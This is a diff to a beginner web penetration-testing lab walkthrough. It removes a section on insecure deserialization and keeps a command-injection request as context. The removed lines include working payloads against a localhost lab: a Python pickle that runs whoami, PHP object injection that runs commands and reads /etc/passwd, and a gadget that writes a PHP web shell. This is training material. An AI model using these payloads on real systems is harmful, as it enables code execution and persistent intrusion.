@@ -1,6 +1,6 @@
 # Zeroday Academy - Beginner Labs Walkthrough
 
-**Complete step-by-step solutions for all 9 beginner web penetration testing labs**
+**Complete step-by-step solutions for all 8 beginner web penetration testing labs**
 
 ---
 
@@ -14,7 +14,6 @@
 6. [Broken Access Control](#6-broken-access-control)
 7. [Security Misconfiguration](#7-security-misconfiguration)
 8. [Command Injection](#8-command-injection)
-9. [Insecure Deserialization](#9-insecure-deserialization)
 
 ---
 
@@ -807,135 +806,6 @@ curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; python
 3. Implement strict input validation and sanitization
 4. Use whitelist approach for allowed commands and parameters
 5. Run applications with minimal privileges (principle of least privilege)
-
----
-
-## 9. Insecure Deserialization
-
-### Vulnerability Description
-Insecure deserialization vulnerabilities occur when untrusted data is used to abuse application logic, inflict denial of service attacks, or execute arbitrary code when deserializing objects.
-
-### Impact
-- Remote code execution
-- Privilege escalation
-- Denial of service attacks
-- Authentication bypass
-- Data tampering
-
-### Lab Solution Steps
-
-#### Step 1: Identify Serialized Data
-**Objective:** Find endpoints that accept serialized objects
-
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -H "Content-Type: application/json" \
-  -d "{\"data\": \"test\"}"
-```
-
-**Test different content types:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "data=test"
-```
-
-**Explanation:** Test basic deserialization functionality to understand the data format and processing.
-
-#### Step 2: Analyze Serialization Format
-**Objective:** Determine the serialization format being used
-
-**PHP Serialized Object:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=O:4:\"User\":1:{s:4:\"name\";s:4:\"test\";}"
-```
-
-**Java Serialized Object (Base64 encoded):**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4"
-```
-
-**Python Pickle:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=cos%0Asystem%0A%28S%27whoami%27%0AtR%2E"
-```
-
-**Explanation:** Test with different serialization formats to determine which one the application uses.
-
-#### Step 3: Object Injection
-**Objective:** Inject malicious objects into the serialized data
-
-**PHP Object Injection:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=O:10:\"EvilObject\":1:{s:7:\"command\";s:6:\"whoami\";}"
-```
-
-**With magic methods:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=O:9:\"FileClass\":1:{s:8:\"filename\";s:11:\"/etc/passwd\";}"
-```
-
-**Explanation:** Inject objects that might execute code during deserialization through magic methods or destructors.
-
-#### Step 4: Property Oriented Programming
-**Objective:** Chain existing classes to achieve code execution
-
-**Example payload using existing classes:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=O:8:\"FileRead\":1:{s:4:\"path\";s:11:\"/etc/passwd\";}"
-```
-
-**Chain multiple objects:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=O:10:\"ChainClass\":2:{s:4:\"cmd1\";O:7:\"Command\":1:{s:4:\"exec\";s:6:\"whoami\";}s:4:\"cmd2\";O:8:\"FileRead\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}}"
-```
-
-**Explanation:** Use existing classes in the application in unexpected ways to achieve file reading or code execution.
-
-### Advanced Exploitation
-
-#### Create Custom Exploit Objects
-**For applications using specific frameworks:**
-
-**PHP - Create exploit for common classes:**
-```php
-<?php
-class Logger {
-    public $logfile;
-    public $data;
-    
-    function __destruct() {
-        file_put_contents($this->logfile, $this->data);
-    }
-}
-
-$exploit = new Logger();
-$exploit->logfile = "shell.php";
-$exploit->data = "<?php system($_GET['cmd']); ?>";
-
-echo serialize($exploit);
-?>
-```
-
-**Use the generated payload:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/deserialize" \
-  -d "serialized=O:6:\"Logger\":2:{s:7:\"logfile\";s:9:\"shell.php\";s:4:\"data\";s:29:\"<?php system(\$_GET['cmd']); ?>\";}"
-```
-
-### Prevention Measures
-1. Avoid deserializing untrusted data whenever possible
-2. Implement integrity checks such as digital signatures on serialized objects
-3. Isolate deserialization processes in low privilege environments
-4. Log and monitor deserialization exceptions and failures
-5. Use safer data interchange formats like JSON instead of native serialization when possible
 
 ---
 
